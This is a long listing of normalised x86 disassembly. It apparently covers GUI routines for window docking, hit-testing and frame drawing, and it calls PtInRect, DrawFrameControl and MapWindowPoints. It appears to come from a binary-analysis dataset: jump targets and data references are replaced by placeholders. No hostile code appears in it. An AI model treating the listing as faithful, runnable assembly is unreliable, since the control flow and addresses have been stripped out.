mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44700c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44700c
pop ecx
sub_447064
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44700c
pop ecx
sub_447090
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447090
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447090
pop ecx
sub_4470e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_447064
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_446950
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_446950
push eax
mov edx 0x1
mov eax ebx
call sub_4468e4
push eax
mov edx 0x2
mov eax ebx
call sub_4468e4
pop edx
pop ecx
call sub_412668
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402cac
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_447168
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_446ba0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412668
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43db0c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4467cc
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_447064
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_4467f0
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_448090
mov edx esi
mov eax ebx
call sub_447064
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43e0f0
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4467cc
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43e0dc
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_446950
mov edx eax
mov eax edi
call sub_446d40
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_446950
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_446950
mov edx eax
mov eax edi
call sub_446d40
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_446950
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_447378
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_447520
jmp r-xdata
sub_447378
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4467cc
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_446d18
mov edx eax
mov eax ebx
call sub_446d40
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_446d40
mov eax [ esi + 0x64 ]
call sub_446d18
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4483e8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4470cc
mov eax [ esi + 0x64 ]
call sub_446d18
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4483e8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4470cc
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44876c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4470cc
mov eax [ esi + 0x64 ]
call sub_446d18
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4488a0
xor edx edx
mov eax esi
call sub_4470cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_446d40
adc edx 0x0
mov eax ebx
call sub_446a00
mov eax ebx
call sub_446d90
push esi
push sub_4488a0
xor edx edx
mov eax esi
call sub_4470cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_447520
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_446a00
mov eax [ ebx + 0x14 ]
call sub_446d90
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_447598
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_446d18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_446d18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_446d18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4468e4
mov esi eax
mov edx 0x2
mov eax ebx
call sub_4468e4
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_446d18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_446df0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446e18
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446df0
call sub_447598
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446e18
call sub_447598
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_446950
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_446950
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4477c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_441698
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412618
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447858
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4477c4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446e18
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_447064
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_446e18
call sub_447598
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4478e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403fe0
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40462c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_447928
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447b20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_447ff8
mov eax [ ebp - 0x8 ]
call sub_446ff4
xor edx edx
push ebp
push sub_447b03
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b0a
mov eax [ ebp - 0x8 ]
call sub_446ff8
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4467cc
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4478e0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40348c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_446aec
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4478e0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43e06c
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43ee80
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403290
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_447b30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412640
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d780
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41cc14
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d3c4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d364
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d364
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41cc14
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d364
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d364
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_447c10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_447b30
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_447b88
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_447b88
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_447b30
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_447b88
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_447b88
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_447cec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447e42
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43cd28
mov eax [ ebp - 0x4 ]
call sub_41d39c
xor eax eax
push ebp
push sub_447e25
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d800
xor eax eax
push ebp
push sub_447e08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_441698
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e0f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d800
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43daec
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_447e50
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_443498
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43db94
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43db50
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_444968
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
